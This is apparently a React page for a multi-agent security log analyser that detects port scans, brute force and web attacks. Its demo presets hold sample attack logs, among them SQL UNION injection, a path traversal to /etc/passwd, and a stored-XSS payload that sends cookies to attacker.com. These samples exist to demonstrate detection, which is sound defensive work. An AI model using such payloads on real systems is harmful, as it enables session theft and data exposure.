import React, { useState } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Play,
  Upload,
  FileText,
  AlertTriangle,
  Activity,
  ArrowRight,
  Terminal,
  CheckCircle2,
  Copy,
  Check,
  Network,
  Cpu,
  Globe,
  Sparkles,
  Layers,
  FileCode,
  RotateCcw
} from 'lucide-react';
import { NavPageId } from '../types';

interface Finding {
  id?: string;
  agent: string;
  threat_type: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  confidence: number;
  description: string;
  evidence?: string[];
  indicators?: string[];
  mitre_technique?: string;
  mitre_tactic?: string;
}

interface RiskAssessment {
  risk_score: number;
  risk_band: string;
  priority: string;
  factors?: Record<string, { value: any; contribution: number }>;
  explanation?: string;
}

interface Correlation {
  id?: string;
  rule: string;
  strength: string;
  score: number;
  description: string;
  entities?: Record<string, any>;
}

interface AnalysisResult {
  status: string;
  events_parsed: number;
  events_by_source?: Record<string, number>;
  threat_detected: boolean;
  findings: Finding[];
  findings_count: number;
  agents_used: string[];
  correlations?: Correlation[];
  risk_assessment?: RiskAssessment;
  incident?: {
    id: string;
    title: string;
    severity: string;
    priority: string;
    primary_ip?: string;
    affected_host?: string;
    mitre_techniques?: string[];
  };
  processing_time_ms: number;
  analyzed_at: string;
  filename?: string;
}

interface AnalyzeLogsPageProps {
  onNavigate?: (page: NavPageId) => void;
  onNavigateToIncident?: (incidentId: string) => void;
}

const DEMO_PRESETS = [
  {
    id: 'mixed_attack',
    name: 'Multi-Agent Attack Chain',
    icon: Sparkles,
    badge: 'Multi-Agent',
    badgeColor: 'bg-red-500/20 text-red-400 border-red-500/30',
    description: 'Port Scan + SSH Brute Force + SQL Injection multi-stage attack',
    source: 'auto',
    sample: `2026-09-17T11:00:01Z src_ip=203.0.113.50 dst_ip=10.0.0.5 port=22 proto=TCP SYN action=connect
2026-09-17T11:00:02Z src_ip=203.0.113.50 dst_ip=10.0.0.5 port=80 proto=TCP SYN action=connect
2026-09-17T11:00:03Z src_ip=203.0.113.50 dst_ip=10.0.0.5 port=443 proto=TCP SYN action=connect
2026-09-17T11:00:04Z src_ip=203.0.113.50 dst_ip=10.0.0.5 port=3306 proto=TCP SYN action=connect
Sep 17 11:01:01 server01 sshd[12345]: Failed password for admin from 203.0.113.50 port 54321 ssh2
Sep 17 11:01:03 server01 sshd[12345]: Failed password for admin from 203.0.113.50 port 54322 ssh2
Sep 17 11:01:05 server01 sshd[12345]: Failed password for root from 203.0.113.50 port 54323 ssh2
Sep 17 11:01:07 server01 sshd[12345]: Failed password for admin from 203.0.113.50 port 54324 ssh2
Sep 17 11:01:09 server01 sshd[12345]: Accepted password for admin from 203.0.113.50 port 54325 ssh2
Sep 17 11:01:11 server01 sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash
2026-09-17T11:02:01Z 203.0.113.50 POST /api/data HTTP/1.1 200 application/json body=1' UNION SELECT * FROM users--
2026-09-17T11:02:05Z 203.0.113.50 GET /admin/console HTTP/1.1 403 text/html`
  },
  {
    id: 'network_port_scan',
    name: 'Network Port Scan',
    icon: Network,
    badge: 'Network',
    badgeColor: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
    description: 'Rapid port sweep across critical services from single host',
    source: 'network',
    sample: `2026-09-17T10:00:01Z src_ip=192.168.1.105 dst_ip=10.0.0.1 port=21 proto=TCP action=connect
2026-09-17T10:00:02Z src_ip=192.168.1.105 dst_ip=10.0.0.1 port=22 proto=TCP action=connect
2026-09-17T10:00:03Z src_ip=192.168.1.105 dst_ip=10.0.0.1 port=23 proto=TCP action=connect
2026-09-17T10:00:04Z src_ip=192.168.1.105 dst_ip=10.0.0.1 port=80 proto=TCP action=connect
2026-09-17T10:00:05Z src_ip=192.168.1.105 dst_ip=10.0.0.1 port=443 proto=TCP action=connect
2026-09-17T10:00:06Z src_ip=192.168.1.105 dst_ip=10.0.0.1 port=3306 proto=TCP action=connect`
  },
  {
    id: 'system_brute_force',
    name: 'SSH Auth Brute Force',
    icon: Cpu,
    badge: 'System',
    badgeColor: 'bg-amber-500/20 text-amber-400 border-amber-500/30',
    description: 'Repeated authentication failures followed by root escalation',
    source: 'system',
    sample: `Sep 17 10:15:01 server01 sshd[12345]: Failed password for root from 192.168.1.50 port 45210 ssh2
Sep 17 10:15:03 server01 sshd[12345]: Failed password for root from 192.168.1.50 port 45212 ssh2
Sep 17 10:15:05 server01 sshd[12345]: Failed password for admin from 192.168.1.50 port 45214 ssh2
Sep 17 10:15:07 server01 sshd[12345]: Failed password for admin from 192.168.1.50 port 45216 ssh2
Sep 17 10:15:09 server01 sshd[12345]: Accepted password for admin from 192.168.1.50 port 45218 ssh2
Sep 17 10:15:10 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash`
  },
  {
    id: 'application_sql_injection',
    name: 'Web Application SQLi & XSS',
    icon: Globe,
    badge: 'Application',
    badgeColor: 'bg-purple-500/20 text-purple-400 border-purple-500/30',
    description: 'SQL union injection, directory traversal, and stored XSS attempt',
    source: 'application',
    sample: `2026-09-17T10:25:01Z 192.168.1.200 GET /api/users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 500
2026-09-17T10:25:02Z 192.168.1.200 GET /api/files?path=../../../../etc/passwd HTTP/1.1 400
2026-09-17T10:25:03Z 192.168.1.200 POST /api/comments body=<script>document.location='http://attacker.com/steal?c='+document.cookie</script> HTTP/1.1 200`
  },
  {
    id: 'normal_traffic',
    name: 'Normal Benign Logs',
    icon: CheckCircle2,
    badge: 'Benign',
    badgeColor: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30',
    description: 'Standard benign operational activity (verifies zero false positives)',
    source: 'auto',
    sample: `2026-09-17T10:30:01Z src_ip=192.168.1.10 dst_ip=10.0.0.1 port=443 proto=TCP action=connect status=established
2026-09-17T10:30:05Z src_ip=192.168.1.10 dst_ip=10.0.0.1 port=443 proto=TCP bytes_sent=1500 bytes_recv=3200
Sep 17 10:30:10 server01 sshd[99999]: Accepted password for developer from 192.168.1.10 port 55000 ssh2
Sep 17 10:30:15 server01 systemd[1]: Started Daily apt download activities.
2026-09-17T10:30:20Z 192.168.1.10 GET /api/dashboard HTTP/1.1 200 application/json
2026-09-17T10:30:25Z 192.168.1.10 GET /api/profile HTTP/1.1 200 application/json`
  }
];

export const AnalyzeLogsPage: React.FC<AnalyzeLogsPageProps> = ({
  onNavigate,
  onNavigateToIncident
}) => {
  const [logText, setLogText] = useState<string>(DEMO_PRESETS[0].sample);
  const [sourceType, setSourceType] = useState<string>('auto');
  const [selectedFileName, setSelectedFileName] = useState<string | null>(null);
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [analysisStep, setAnalysisStep] = useState<string>('');
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState<boolean>(false);

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setSelectedFileName(file.name);
    const reader = new FileReader();
    reader.onload = (ev) => {
      const text = ev.target?.result as string;
      if (text) {
        setLogText(text);
        setError(null);
      }
    };
    reader.onerror = () => {
      setError('Failed to read uploaded log file.');
    };
    reader.readAsText(file);
  };

  const handleRunAnalysis = async () => {
    if (!logText.trim()) {
      setError('Please paste log text or upload a log file first.');
      return;
    }

    setIsAnalyzing(true);
    setError(null);
    setAnalysisStep('Initializing multi-agent pipeline...');

    const steps = [
      'Normalizing raw log streams...',
      'Running NetworkAgent detector...',
      'Running SystemAgent detector...',
      'Running ApplicationAgent detector...',
      'Executing EventCorrelator cross-surface correlation...',
      'Calculating deterministic risk scores & priority...'
    ];

    let stepIndex = 0;
    const interval = setInterval(() => {
      if (stepIndex < steps.length) {
        setAnalysisStep(steps[stepIndex]);
        stepIndex++;
      }
    }, 280);

    try {
      const response = await fetch('/api/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          log_text: logText,
          source_type: sourceType,
          filename: selectedFileName || undefined
        })
      });

      clearInterval(interval);

      if (!response.ok) {
        const errData = await response.json().catch(() => ({ detail: 'Analysis failed' }));
        throw new Error(errData.detail || errData.error || `HTTP ${response.status}`);
      }

      const data: AnalysisResult = await response.json();
      setResult(data);
    } catch (err: any) {
      clearInterval(interval);
      console.error('Analysis error:', err);
      setError(`Analysis Error: ${err.message || 'Could not communicate with backend engine.'}`);
    } finally {
      setIsAnalyzing(false);
      setAnalysisStep('');
    }
  };

  const handleCopySample = () => {
    navigator.clipboard.writeText(logText);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSelectPreset = (preset: typeof DEMO_PRESETS[0]) => {
    setLogText(preset.sample);
    setSourceType(preset.source);
    setSelectedFileName(null);
    setError(null);
  };

  return (
    <div className="space-y-8 max-w-7xl mx-auto pb-16">
      {/* Header Banner */}
      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-slate-900 via-slate-850 to-indigo-950 p-6 md:p-8 border border-slate-800 shadow-xl">
        <div className="absolute right-0 top-0 w-96 h-96 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
          <div>
            <div className="flex items-center gap-3 mb-2">
              <span className="p-2 rounded-lg bg-indigo-500/20 text-indigo-400 border border-indigo-500/30">
                <Layers className="w-6 h-6" />
              </span>
              <span className="text-xs font-semibold uppercase tracking-wider text-indigo-400 bg-indigo-950/60 px-2.5 py-1 rounded-full border border-indigo-800/50">
                Autonomous Security Intelligence
              </span>
            </div>
            <h1 className="text-2xl md:text-3xl font-bold text-white tracking-tight">
              AI-Driven Multi-Agent Log Analysis
            </h1>
            <p className="text-slate-400 text-sm md:text-base mt-2 max-w-2xl">
              Inspect logs instantly with coordinated Network, System, and Application agents.
              Detects port scans, brute-force, web exploits, correlates attacks, and logs persistent incidents.
            </p>
          </div>

          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => {
                setLogText('');
                setSelectedFileName(null);
                setResult(null);
                setError(null);
              }}
              className="px-3.5 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-medium border border-slate-700 flex items-center gap-2 transition"
            >
              <RotateCcw className="w-3.5 h-3.5" /> Clear Input
            </button>
          </div>
        </div>
      </div>

      {/* Quick Demo Scenarios Bar */}
      <div>
        <div className="flex items-center justify-between mb-3">
          <span className="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center gap-2">
            <Sparkles className="w-4 h-4 text-cyan-400" /> Quick Demonstration Scenarios
          </span>
          <span className="text-xs text-slate-500">Click any scenario to prefill and analyze</span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
          {DEMO_PRESETS.map((p) => {
            const Icon = p.icon;
            return (
              <button
                key={p.id}
                onClick={() => handleSelectPreset(p)}
                className="p-3.5 rounded-xl bg-slate-900/90 hover:bg-slate-800/90 border border-slate-800 hover:border-slate-700 text-left transition group relative overflow-hidden flex flex-col justify-between"
              >
                <div>
                  <div className="flex items-center justify-between gap-2 mb-2">
                    <span className="p-1.5 rounded-lg bg-slate-800 text-slate-300 group-hover:text-cyan-400 transition">
                      <Icon className="w-4 h-4" />
                    </span>
                    <span className={`text-[10px] px-2 py-0.5 rounded-full font-medium border ${p.badgeColor}`}>
                      {p.badge}
                    </span>
                  </div>
                  <h4 className="text-sm font-medium text-slate-200 group-hover:text-white line-clamp-1">
                    {p.name}
                  </h4>
                  <p className="text-[11px] text-slate-500 mt-1 line-clamp-2">
                    {p.description}
                  </p>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Log Input Section */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        <div className="lg:col-span-8 space-y-4">
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg flex flex-col h-full">
            <div className="flex flex-wrap items-center justify-between gap-3 mb-3">
              <div className="flex items-center gap-2">
                <FileCode className="w-4 h-4 text-cyan-400" />
                <span className="text-sm font-semibold text-white">Log Stream Input</span>
                {selectedFileName && (
                  <span className="text-xs bg-cyan-950 text-cyan-300 border border-cyan-800/60 px-2 py-0.5 rounded-md">
                    {selectedFileName}
                  </span>
                )}
              </div>

              <div className="flex items-center gap-2">
                <label className="text-xs text-slate-400 font-medium">Source Type:</label>
                <select
                  value={sourceType}
                  onChange={(e) => setSourceType(e.target.value)}
                  className="bg-slate-800 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                >
                  <option value="auto">Auto-Detect Source</option>
                  <option value="network">Network Logs</option>
                  <option value="system">System / Auth Logs</option>
                  <option value="application">Application / Web Logs</option>
                </select>
                <button
                  onClick={handleCopySample}
                  className="p-1.5 rounded-md hover:bg-slate-800 text-slate-400 hover:text-slate-200 transition text-xs flex items-center gap-1"
                  title="Copy log text"
                >
                  {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            </div>

            <textarea
              value={logText}
              onChange={(e) => setLogText(e.target.value)}
              placeholder="Paste raw log lines, auth.log, syslog, access.log, or network telemetry here..."
              rows={12}
              className="w-full bg-slate-950/80 border border-slate-800/80 rounded-xl p-3.5 font-mono text-xs text-slate-300 placeholder-slate-600 focus:outline-none focus:border-cyan-500/70 resize-y leading-relaxed"
            />

            <div className="flex flex-wrap items-center justify-between gap-4 mt-4 pt-4 border-t border-slate-800/80">
              <span className="text-xs text-slate-500">
                {logText.trim() ? `${logText.trim().split('\n').length} lines ready` : 'No logs loaded'}
              </span>

              <button
                onClick={handleRunAnalysis}
                disabled={isAnalyzing || !logText.trim()}
                className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 disabled:from-slate-800 disabled:to-slate-800 text-white font-semibold text-sm shadow-lg shadow-cyan-900/30 flex items-center gap-2.5 transition active:scale-[0.98] disabled:cursor-not-allowed"
              >
                {isAnalyzing ? (
                  <>
                    <Activity className="w-4 h-4 animate-spin text-cyan-200" />
                    <span>Analyzing...</span>
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4 fill-white text-white" />
                    <span>Run Multi-Agent Analysis</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        {/* Upload & Agent Status Panel */}
        <div className="lg:col-span-4 space-y-4">
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg">
            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
              <Upload className="w-4 h-4 text-cyan-400" /> Upload File (.log, .txt, .csv)
            </h3>
            <label className="border-2 border-dashed border-slate-700/80 hover:border-cyan-500/60 rounded-xl p-6 flex flex-col items-center justify-center text-center cursor-pointer transition bg-slate-950/40 group">
              <Upload className="w-8 h-8 text-slate-500 group-hover:text-cyan-400 mb-2 transition" />
              <span className="text-xs font-medium text-slate-300 group-hover:text-white">
                Drag & drop or click to upload
              </span>
              <span className="text-[11px] text-slate-500 mt-1">
                Supports syslog, auth.log, apache, json, csv
              </span>
              <input
                type="file"
                accept=".log,.txt,.csv,.json"
                onChange={handleFileUpload}
                className="hidden"
              />
            </label>
          </div>

          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-3">
            <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center gap-2">
              <Terminal className="w-3.5 h-3.5 text-indigo-400" /> Active Agent Pipeline
            </h3>
            <div className="space-y-2.5">
              <div className="flex items-center justify-between p-2.5 rounded-lg bg-slate-950/60 border border-slate-800/80">
                <div className="flex items-center gap-2.5">
                  <Network className="w-4 h-4 text-blue-400" />
                  <div>
                    <div className="text-xs font-medium text-slate-200">Network Agent</div>
                    <div className="text-[10px] text-slate-500">Port scan, brute sweep, IP telemetry</div>
                  </div>
                </div>
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              </div>

              <div className="flex items-center justify-between p-2.5 rounded-lg bg-slate-950/60 border border-slate-800/80">
                <div className="flex items-center gap-2.5">
                  <Cpu className="w-4 h-4 text-amber-400" />
                  <div>
                    <div className="text-xs font-medium text-slate-200">System Agent</div>
                    <div className="text-[10px] text-slate-500">Auth failures, privilege escalation, sudo</div>
                  </div>
                </div>
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              </div>

              <div className="flex items-center justify-between p-2.5 rounded-lg bg-slate-950/60 border border-slate-800/80">
                <div className="flex items-center gap-2.5">
                  <Globe className="w-4 h-4 text-purple-400" />
                  <div>
                    <div className="text-xs font-medium text-slate-200">Application Agent</div>
                    <div className="text-[10px] text-slate-500">SQL injection, XSS, path traversal</div>
                  </div>
                </div>
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Progress Notification */}
      {isAnalyzing && (
        <div className="p-4 rounded-xl bg-cyan-950/40 border border-cyan-800/60 flex items-center gap-3 animate-pulse">
          <Activity className="w-5 h-5 text-cyan-400 animate-spin" />
          <div>
            <div className="text-sm font-semibold text-cyan-200">Analysis In Progress</div>
            <div className="text-xs text-cyan-400 font-mono">{analysisStep}</div>
          </div>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="p-4 rounded-xl bg-red-950/40 border border-red-800/60 flex items-center gap-3 text-red-200 text-sm">
          <AlertTriangle className="w-5 h-5 text-red-400 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      {/* Analysis Results Section */}
      {result && (
        <div className="space-y-6 pt-4">
          {/* Main Verdict Card */}
          <div
            className={`p-6 rounded-2xl border shadow-2xl relative overflow-hidden ${
              result.threat_detected
                ? 'bg-gradient-to-r from-red-950/80 via-slate-900 to-slate-900 border-red-500/40'
                : 'bg-gradient-to-r from-emerald-950/60 via-slate-900 to-slate-900 border-emerald-500/40'
            }`}
          >
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
              <div className="flex items-start gap-4">
                <span
                  className={`p-3 rounded-xl shrink-0 ${
                    result.threat_detected
                      ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                      : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                  }`}
                >
                  {result.threat_detected ? (
                    <ShieldAlert className="w-8 h-8" />
                  ) : (
                    <ShieldCheck className="w-8 h-8" />
                  )}
                </span>
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span
                      className={`text-xs font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full ${
                        result.threat_detected
                          ? 'bg-red-500/20 text-red-300 border border-red-500/30'
                          : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                      }`}
                    >
                      {result.threat_detected ? 'Threat Detected' : 'Clean / Benign'}
                    </span>
                    <span className="text-xs text-slate-500">
                      Processed in {result.processing_time_ms}ms
                    </span>
                  </div>
                  <h2 className="text-xl md:text-2xl font-bold text-white">
                    {result.threat_detected
                      ? result.incident?.title || `${result.findings_count} Security Threats Identified`
                      : 'Zero Threats Detected — Standard Benign Operations'}
                  </h2>
                  <p className="text-xs md:text-sm text-slate-400 mt-1">
                    {result.threat_detected
                      ? `Coordinated multi-agent analysis identified malicious behavior across ${result.agents_used?.join(', ') || 'security agents'}.`
                      : 'All examined telemetry matches normal behavioral baselines with no signature or anomaly alerts.'}
                  </p>
                </div>
              </div>

              {/* Risk Score Widget */}
              {result.risk_assessment && (
                <div className="flex items-center gap-4 bg-slate-950/70 p-4 rounded-xl border border-slate-800">
                  <div className="text-right">
                    <div className="text-xs text-slate-400 font-medium">Risk Score</div>
                    <div
                      className={`text-3xl font-extrabold ${
                        result.risk_assessment.risk_score >= 70
                          ? 'text-red-400'
                          : result.risk_assessment.risk_score >= 40
                          ? 'text-amber-400'
                          : 'text-emerald-400'
                      }`}
                    >
                      {Math.round(result.risk_assessment.risk_score)}
                      <span className="text-sm font-normal text-slate-500">/100</span>
                    </div>
                    <div className="text-[10px] text-slate-400 font-semibold uppercase tracking-wider">
                      {result.risk_assessment.risk_band} Priority: {result.risk_assessment.priority}
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Persistent Incident Link Banner */}
            {result.incident && (
              <div className="mt-5 pt-4 border-t border-red-800/40 flex flex-wrap items-center justify-between gap-3 bg-red-950/30 -mx-6 -mb-6 p-4 px-6">
                <div className="flex items-center gap-2 text-xs text-red-200">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                  <span>
                    Incident <strong>{result.incident.id}</strong> recorded to database & Incident Queue.
                  </span>
                </div>
                {onNavigate && (
                  <button
                    onClick={() => {
                      if (onNavigateToIncident && result.incident?.id) {
                        onNavigateToIncident(result.incident.id);
                      } else {
                        onNavigate('incidents');
                      }
                    }}
                    className="px-3.5 py-1.5 rounded-lg bg-red-600 hover:bg-red-500 text-white text-xs font-semibold flex items-center gap-1.5 transition shadow"
                  >
                    View in Incidents <ArrowRight className="w-3.5 h-3.5" />
                  </button>
                )}
              </div>
            )}
          </div>

          {/* Metric Stats Grid */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
              <div className="text-xs text-slate-400">Events Parsed</div>
              <div className="text-2xl font-bold text-white mt-1">{result.events_parsed}</div>
              <div className="text-[10px] text-slate-500 mt-1">Normalized events</div>
            </div>

            <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
              <div className="text-xs text-slate-400">Security Findings</div>
              <div className="text-2xl font-bold text-red-400 mt-1">{result.findings_count}</div>
              <div className="text-[10px] text-slate-500 mt-1">Threat indicators</div>
            </div>

            <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
              <div className="text-xs text-slate-400">Correlated Chains</div>
              <div className="text-2xl font-bold text-cyan-400 mt-1">
                {result.correlations?.length || 0}
              </div>
              <div className="text-[10px] text-slate-500 mt-1">Cross-surface correlations</div>
            </div>

            <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
              <div className="text-xs text-slate-400">Agents Involved</div>
              <div className="text-sm font-semibold text-slate-200 mt-2 flex flex-wrap gap-1">
                {result.agents_used?.length ? (
                  result.agents_used.map((a) => (
                    <span key={a} className="px-2 py-0.5 rounded bg-slate-800 text-[11px] text-cyan-300">
                      {a}
                    </span>
                  ))
                ) : (
                  <span className="text-slate-500 text-xs">All Agents</span>
                )}
              </div>
            </div>
          </div>

          {/* Detailed Security Findings List */}
          {result.findings?.length > 0 && (
            <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-lg space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <ShieldAlert className="w-5 h-5 text-red-400" />
                  Security Findings Breakdown ({result.findings.length})
                </h3>
              </div>

              <div className="space-y-3">
                {result.findings.map((f, i) => (
                  <div
                    key={f.id || i}
                    className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-2 hover:border-slate-700 transition"
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <span className="text-xs px-2.5 py-0.5 rounded-full font-semibold bg-slate-800 text-slate-200 border border-slate-700">
                          {f.agent}
                        </span>
                        <h4 className="text-sm font-bold text-white">{f.threat_type}</h4>
                      </div>

                      <div className="flex items-center gap-2">
                        <span
                          className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                            f.severity === 'CRITICAL'
                              ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                              : f.severity === 'HIGH'
                              ? 'bg-orange-500/20 text-orange-300 border border-orange-500/40'
                              : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                          }`}
                        >
                          {f.severity}
                        </span>
                        <span className="text-xs text-slate-400">
                          Confidence: {Math.round(f.confidence * 100)}%
                        </span>
                      </div>
                    </div>

                    <p className="text-xs text-slate-300">{f.description}</p>

                    {f.evidence && f.evidence.length > 0 && (
                      <div className="bg-slate-900 p-2.5 rounded-lg border border-slate-800 text-[11px] font-mono text-slate-400 space-y-1">
                        <span className="text-[10px] text-slate-500 font-sans block uppercase tracking-wider">
                          Evidence Extracted:
                        </span>
                        {f.evidence.map((ev, idx) => (
                          <div key={idx} className="text-slate-300 truncate">
                            • {ev}
                          </div>
                        ))}
                      </div>
                    )}

                    {f.mitre_technique && (
                      <div className="flex items-center gap-2 pt-1 text-[11px] text-slate-400">
                        <span className="text-slate-500">MITRE ATT&CK:</span>
                        <span className="bg-slate-800 text-cyan-300 px-2 py-0.5 rounded border border-slate-700 font-mono">
                          {f.mitre_technique}
                        </span>
                        {f.mitre_tactic && (
                          <span className="text-slate-500">({f.mitre_tactic})</span>
                        )}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Correlations & Attack Chain */}
          {result.correlations && result.correlations.length > 0 && (
            <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-lg space-y-3">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Layers className="w-4 h-4 text-cyan-400" />
                Cross-Agent Correlations ({result.correlations.length})
              </h3>
              <div className="space-y-2">
                {result.correlations.map((c, i) => (
                  <div
                    key={c.id || i}
                    className="p-3.5 rounded-xl bg-slate-950/60 border border-slate-800 text-xs flex flex-col md:flex-row md:items-center justify-between gap-3"
                  >
                    <div>
                      <div className="font-semibold text-slate-200">{c.rule}</div>
                      <div className="text-slate-400 text-[11px] mt-0.5">{c.description}</div>
                    </div>
                    <div className="flex items-center gap-2 shrink-0">
                      <span className="bg-cyan-950 text-cyan-300 border border-cyan-800 px-2 py-0.5 rounded text-[10px] font-semibold">
                        Strength: {c.strength}
                      </span>
                      <span className="bg-slate-800 text-slate-300 px-2 py-0.5 rounded text-[10px]">
                        Score: {c.score}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};
